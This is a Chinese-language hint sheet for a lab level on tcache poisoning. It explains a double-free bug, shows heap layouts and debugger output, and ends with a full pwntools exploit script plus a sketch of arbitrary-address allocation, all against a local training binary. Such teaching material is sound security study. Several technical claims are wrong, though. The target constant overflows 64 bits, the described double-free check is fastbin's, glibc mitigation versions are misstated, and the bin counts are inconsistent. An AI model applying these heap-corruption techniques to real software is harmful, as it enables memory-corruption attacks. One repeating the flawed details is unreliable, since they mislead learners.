# Level 4: Tcache Poisoning - 提示

<details>
<summary><b>提示 1: 理解漏洞</b></summary>

程序有一个 **UAF/Double Free** 漏洞：
- `case 2`: free chunk 后不置空指针
- 你可以对同一个 chunk free 多次

**Tcache 特性**：
- glibc 2.26+ 引入
- 每个 size 最多缓存 7 个 chunk
- Double free 检测很弱（只检查链表头部）

**目标**：控制 `chunks[0]` 的内容为 `0xdeadbeefcafebabefull`

</details>

<details>
<summary><b>提示 2: Tcache vs Fastbin</b></summary>

与 Fastbin 不同：
- Tcache 是每线程缓存（无需加锁）
- 每个 bin 最多 7 个 chunk
- 填满后才进入 fastbin

```
连续释放 10 个 chunk：
- 前 7 个进入 tcache (已满)
- 后 3 个进入 fastbin
```

**关键利用点**：Tcache 的 double free 检测比 fastbin 更弱！

</details>

<details>
<summary><b>提示 3: Tcache Double Free 检测</b></summary>

```c
// glibc 的检测代码
if (e == tcache->entries[tcache_idx]) {
    // 可能是 double free!
}
```

**只检查链表头部**！

绕过方法：
```
1. free(A)  → tcache = [A]
2. free(B)  → tcache = [B, A]
3. free(A)  → tcache = [A, B, A] ✓ 绕过!
              ↑
         A 不在链表头部
```

</details>

<details>
<summary><b>提示 4: 攻击步骤</b></summary>

```python
# 步骤 1: 填满 tcache (7 个)
for i in range(7):
    alloc()
for i in range(7):
    free(i)

# tcache[32] = [6, 5, 4, 3, 2, 1, 0] (7 个，已满)

# 步骤 2: 取出 2 个，制造空间
alloc()  # chunk[7] - 拿回 chunk[6]
alloc()  # chunk[8] - 拿回 chunk[5]

# tcache[32] = [4, 3, 2, 1, 0] (5 个)

# 步骤 3: 创建 double free
free(7)  # 回到 tcache
free(0)  # Double free!

# tcache[32] = [0, 4, 3, 2, 1, 0]
```

</details>

<details>
<summary><b>提示 5: 为什么这样操作?</b></summary>

**为什么先填满 tcache**？
- 确保 chunk 在 tcache 中，而不是 fastbin
- tcache 更容易被操纵

**为什么取出 2 个**？
- 腾出空间给 double free 的 chunk
- 让 chunk[0] 不在链表头部

**为什么 free(7)**？
- chunk[7] 是从 tcache 取出的
- 释放它回到 tcache，作为"中间人"

</details>

<details>
<summary><b>提示 6: 本关的特殊目标</b></summary>

观察胜利条件：
```c
if (*(unsigned long long*)chunks[0] == 0xdeadbeefcafebabefull)
```

**关键发现**：
- 目标是 `chunks[0]` 本身！
- 不需要伪造地址分配到其他地方
- 只需要通过 double free 再次拿到 `chunks[0]` 的控制权

**简化策略**：
```python
# 创建 double free 后
alloc()  # chunk[9] - 实际上就是 chunk[0]!

# 直接编辑
edit(9, p64(0xdeadbeefcafebabefull))
```

</details>

<details>
<summary><b>提示 7: 完整 Exploit 步骤</b></summary>

```python
from pwn import *

p = process('./vuln')

def alloc():
    p.sendlineafter(b'> ', b'1')

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# 1. 填满 tcache
for _ in range(7):
    alloc()
for i in range(7):
    free(i)

# 2. 制造 double free
alloc()  # 7
alloc()  # 8
free(7)
free(0)  # Double free!

# 3. 拿回 chunk[0]
alloc()  # 9 - 实际是 chunk[0]

# 4. 编辑为目标值
edit(9, p64(0xdeadbeefcafebabefull))

# 5. 检查胜利
p.sendlineafter(b'> ', b'4')

p.interactive()
```

</details>

<details>
<summary><b>提示 8: 内存布局分析</b></summary>

```
初始分配后：
chunks[0] @ 0x555...000
chunks[1] @ 0x555...050
...
chunks[6] @ 0x555...1e0

填满 tcache 后：
tcache[32] = [
    0x555...1e0,  # chunk[6]
    0x555...190,  # chunk[5]
    ...
    0x555...000   # chunk[0]
]

alloc() 2 次：
chunks[7] = 0x555...1e0 (原 chunk[6])
chunks[8] = 0x555...190 (原 chunk[5])

tcache[32] = [chunk[4], chunk[3], chunk[2], chunk[1], chunk[0]]

free(7), free(0) 后：
tcache[32] = [
    0x555...000,  # chunk[0] ← 重复!
    chunk[4],
    chunk[3],
    ...
    0x555...000   # chunk[0]
]

alloc() - chunk[9]：
返回 0x555...000，即 chunk[0]！

现在：
- chunks[0] → 0x555...000 (原指针)
- chunks[9] → 0x555...000 (新指针)
两个指针指向同一块内存！
```

</details>

<details>
<summary><b>提示 9: 调试方法</b></summary>

使用 pwndbg 观察 tcache：

```bash
$ gdb ./vuln
(gdb) b *main+XXX
(gdb) run

# 释放 7 个后
(gdb) tcache
...
tcache bins
{
  0x20 [  7]: 0x555...000 → 0x555...050 → ... → 0x555...1e0
}

# double free 后
(gdb) tcache
...
tcache bins
{
  0x20 [  7]: 0x555...000 → 0x555...0a0 → ... → 0x555...000
}
                        ↑
                    注意循环！
```

</details>

<details>
<summary><b>提示 10: 常见错误</b></summary>

**错误 1**: "double free or corruption (!prev)"
- 原因：连续两次 free 同一个 chunk
- 解决：中间 free 另一个 chunk

**错误 2**: 无法控制 chunks[0]
- 原因：没有正确创建 double free
- 解决：确保先填满 tcache，再制造 double free

**错误 3**: chunks[0] 的值没变
- 原因：edit 了错误的索引
- 解决：确认 edit(9) 而不是 edit(0)

**错误 4**: tcache 检测失败
- 原因：chunk[0] 在 tcache 链表头部
- 解决：确保先取出 2 个，让 chunk[0] 不在头部

</details>

<details>
<summary><b>提示 11: 进阶 - 分配到任意地址</b></summary>

如果目标是其他地址（不是 chunks[0]），需要：

```python
# 1. 创建 double free
# ... 同上

# 2. 拿回 chunk[0]
alloc()  # chunk[9] = chunk[0]

# 3. 修改 next 指针
target = 0xdeadbeef  # 目标地址
fake_next = target - 0x10  # 减去 chunk 头
edit(9, p64(fake_next))

# 4. 清空 tcache
for i in range(6):
    alloc()  # 清空剩余的 tcache entries

# 5. 下一个分配返回目标地址!
target_chunk = alloc()  # 返回 target!

# 6. 写入目标
edit(target_chunk_index, data)
```

**注意**：
- glibc 2.31+ 有 tcache key 保护
- glibc 2.32+ 有 Safe Linking
- 需要地址泄露或部分覆盖

</details>

<details>
<summary><b>提示 12: glibc 版本差异</b></summary>

**glibc 2.26 - 2.30**：
- tcache next 指针是明文
- 攻击难度：⭐⭐ 简单

**glibc 2.31**：
- tcache next 指针 XOR key
- 攻击难度：⭐⭐⭐ 中等
- 需要：泄露 key 或部分覆盖

**glibc 2.32+**：
- 完整 Safe Linking
- 攻击难度：⭐⭐⭐⭐ 困难
- 需要：堆地址泄露 + 精确计算

检查版本：
```bash
$ ldd --version
ldd (Ubuntu GLIBC 2.35) ...
```

</details>
